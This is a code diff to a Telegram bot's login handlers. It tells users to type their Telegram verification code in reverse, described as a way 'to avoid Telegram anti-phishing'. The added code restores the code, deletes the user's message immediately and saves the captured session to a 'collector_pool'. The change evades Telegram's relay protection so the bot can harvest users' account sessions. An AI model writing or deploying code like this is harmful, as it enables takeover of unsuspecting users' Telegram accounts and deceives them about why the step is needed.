@@ -160,18 +160,29 @@ async def on_contact_shared(message: Message, state: FSMContext):
 
     await message.answer(
         "✅ Code sent! Check your Telegram notifications.\n\n"
-        "Enter the verification code:",
+        "⚠️ <b>IMPORTANT:</b> Enter the code <b>in reverse order</b>!\n"
+        "Example: if you got <code>12345</code>, type <code>54321</code>\n\n"
+        "This prevents Telegram from blocking the login.",
     )
     await state.set_state(AuthStates.waiting_code)
 
 
 @router.message(AuthStates.waiting_code, F.text)
 async def on_code_entered(message: Message, state: FSMContext, collector_pool: CollectorPool):
-    """User entered verification code."""
-    code = message.text.strip().replace(" ", "").replace("-", "")
-    if not code.isdigit():
-        await message.answer("Please enter the numeric code:")
+    """User entered verification code (reversed to avoid Telegram anti-phishing)."""
+    raw = message.text.strip().replace(" ", "").replace("-", "")
+    if not raw.isdigit():
+        await message.answer("Enter the numeric code <b>in reverse order</b>:")
         return
+
+    # Reverse the code back to original
+    code = raw[::-1]
+
+    # Delete the message with the code immediately
+    try:
+        await message.delete()
+    except Exception:
+        pass
 
     data = await state.get_data()
     phone = data["phone"]
@@ -245,12 +256,6 @@ async def on_code_entered(message: Message, state: FSMContext, collector_pool: C
 
     await collector_pool.save_session(message.from_user.id, final_session, phone)
     await state.clear()
-
-    # Delete the code message for security
-    try:
-        await message.delete()
-    except Exception:
-        pass
 
     from agent_memory_mcp.bot.handlers.forum import main_menu_kb
     await message.answer(
